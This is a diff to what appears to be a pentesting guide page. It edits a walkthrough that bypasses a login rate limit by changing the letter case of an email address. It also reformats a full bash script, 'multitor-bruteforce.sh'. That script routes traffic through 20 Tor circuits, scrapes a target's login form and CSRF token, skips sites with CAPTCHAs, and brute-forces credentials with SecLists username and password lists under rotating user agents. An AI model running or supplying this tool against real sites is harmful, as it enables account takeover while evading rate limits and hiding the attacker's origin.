@@ -196,12 +196,12 @@ Set up repeated login attempts: Use an incorrect password and attempt to log in 
 {% step %}
 Observe account lockout message: After 16 failed login attempts, the account is locked. Even the correct password won’t work anymore
 
-* Response from Burp Repeater:
+* Response from Burp Repeater
 * `{ "message": "Request limit exceeded. Please try again later.", "type": "too-many-requests" }`
 {% endstep %}
 
 {% step %}
-Change email character case: Change the case of a character in the email. For example, switch from `g4l2562z6v@tidissajiiu.com` to `g4l2562z6v@tidiSsajiiu.com` (`s` -> `S`).
+Change email character case: Change the case of a character in the email. For example, switch from `g4l2562z6v@tidissajiiu.com` to `g4l2562z6v@tidiSsajiiu.com` (`s` -> `S`)
 {% endstep %}
 
 {% step %}
@@ -227,43 +227,46 @@ Create Script
 sudo nano multitor-bruteforce.sh
 ```
 
-<pre class="language-bash"><code class="lang-bash">#!/bin/bash
+```bash
+#!/bin/bash
 
-# Config &#x26; Colors
+# Config & Colors
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
 color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
 # Root Check
-[[ "$(id -u)" -ne 0 ]] &#x26;&#x26; { color_print RED "[X] Please run as ROOT."; exit 1; }
+[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
 
 # Input Check
 if [ $# -lt 1 ]; then
-    echo "Usage: $0 &#x3C;domain.com>"
+    echo "Usage: $0 <domain.com>"
     exit 1
 fi
 
 URL="$1"
 UA="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
-<strong>USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
-</strong>PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
+USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"
 
-# Add Debian repo if missing
-if ! grep -q "deb.debian.org/debian" /etc/apt/sources.list; then
-    echo "deb http://deb.debian.org/debian bookworm main contrib non-free non-free-firmware" | tee -a /etc/apt/sources.list
-    apt update
+# install polipo
+if ! command -v "polipo" >/dev/null 2>&1; then
+    wget http://archive.ubuntu.com/ubuntu/pool/universe/p/polipo/polipo_1.1.1-8_amd64.deb -O /tmp/polipo_amd64.deb
+    chmod +x /tmp/polipo_amd64.deb
+    dpkg -i /tmp/polipo_amd64.deb
+    rm -f /tmp/polipo_amd64.deb
 fi
 
 # Install Packages
 for pkg in $DEPS; do
-    if ! dpkg -s "$pkg" &#x26;>/dev/null; then
+    if ! dpkg -s "$pkg" &>/dev/null; then
         color_print YELLOW "[!] Installing $pkg..."
         apt install -y "$pkg"
     fi
 done
 
 # Install Node.js packages
-if ! command -v multitor &#x26;>/dev/null; then
+if ! command -v multitor &>/dev/null; then
     color_print GREEN "[*] Installing http-proxy-to-socks..."
     npm install -g multitor http-proxy-to-socks
 fi
@@ -272,7 +275,7 @@ fi
 if [ ! -d "/usr/share/multitor" ]; then
     git clone https://github.com/trimstray/multitor /usr/share/multitor
     chmod 755 /usr/share/multitor/*
-    cd /usr/share/multitor &#x26;&#x26; ./setup.sh install
+    cd /usr/share/multitor && ./setup.sh install
     color_print GREEN "[*] Successfully Installed multitor"
 fi
 
@@ -282,9 +285,10 @@ if ! systemctl is-active --quiet tor; then
 fi
 
 # Start multitor
-if command -v multitor &#x26;>/dev/null; then
-    multitor -k &#x26;>/dev/null || true
+if command -v multitor &>/dev/null; then
+    multitor -k &>/dev/null || true
 fi
+
 multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy
 
 # Find Login Page
@@ -299,7 +303,7 @@ if [ -z "$LOGIN" ]; then
 fi
 
 HTML=$(curl -s "$LOGIN")
-FORM=$(echo "$HTML" | sed -n '/&#x3C;form/,/&#x3C;\/form>/p' | head -n 100)
+FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
 
 # CAPTCHA check
 if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
@@ -307,12 +311,12 @@ if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captch
     exit 1
 fi
 
-# Extract Form Action &#x26; Method
+# Extract Form Action & Method
 ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
-[ -z "$ACTION" ] &#x26;&#x26; ACTION="$LOGIN"
+[ -z "$ACTION" ] && ACTION="$LOGIN"
 
 METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
-[ -z "$METHOD" ] &#x26;&#x26; METHOD="post"
+[ -z "$METHOD" ] && METHOD="post"
 
 BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
 if [[ "$ACTION" == /* ]]; then
@@ -323,16 +327,16 @@ else
     FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
 fi
 
-# Extract Username &#x26; Password Fields
-USERNAME_FIELD=$(echo "$FORM" | grep -oEi '&#x3C;input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
-PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '&#x3C;input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
-[ -z "$USERNAME_FIELD" ] &#x26;&#x26; USERNAME_FIELD="username"
-[ -z "$PASSWORD_FIELD" ] &#x26;&#x26; PASSWORD_FIELD="password"
+# Extract Username & Password Fields
+USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
+[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
 
 # CSRF Token Extraction
 CSRF_FIELD=""
 CSRF_VALUE=""
-HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '&#x3C;input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
+HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
 while read -r INPUT; do
     NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
     VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
@@ -341,11 +345,11 @@ while read -r INPUT; do
         CSRF_VALUE="$VALUE"
         break
     fi
-done &#x3C;&#x3C;&#x3C; "$HIDDEN_INPUTS"
+done <<< "$HIDDEN_INPUTS"
 
 # Prepare POST Data
-DATA="${USERNAME_FIELD}=FUZZ1&#x26;${PASSWORD_FIELD}=FUZZ2"
-[ -n "$CSRF_FIELD" ] &#x26;&#x26; [ -n "$CSRF_VALUE" ] &#x26;&#x26; DATA="${CSRF_FIELD}=${CSRF_VALUE}&#x26;${DATA}"
+DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
+[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
 COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')
 
@@ -386,7 +390,7 @@ else
          -H "User-Agent:FUZZ3" \
          "${HEADERS[@]}"
 fi
-</code></pre>
+```
 
 {% hint style="info" %}
 Run Script
@@ -430,10 +434,12 @@ USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"
 
-# Add Debian repo if missing
-if ! grep -q "deb.debian.org/debian" /etc/apt/sources.list; then
-    echo "deb http://deb.debian.org/debian bookworm main contrib non-free non-free-firmware" | tee -a /etc/apt/sources.list
-    apt update
+# install polipo
+if ! command -v "polipo" >/dev/null 2>&1; then
+    wget http://archive.ubuntu.com/ubuntu/pool/universe/p/polipo/polipo_1.1.1-8_amd64.deb -O /tmp/polipo_amd64.deb
+    chmod +x /tmp/polipo_amd64.deb
+    dpkg -i /tmp/polipo_amd64.deb
+    rm -f /tmp/polipo_amd64.deb
 fi
 
 # Install Packages
@@ -467,6 +473,7 @@ fi
 if command -v multitor &>/dev/null; then
     multitor -k &>/dev/null || true
 fi
+
 multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy
 
 # Find Login Page
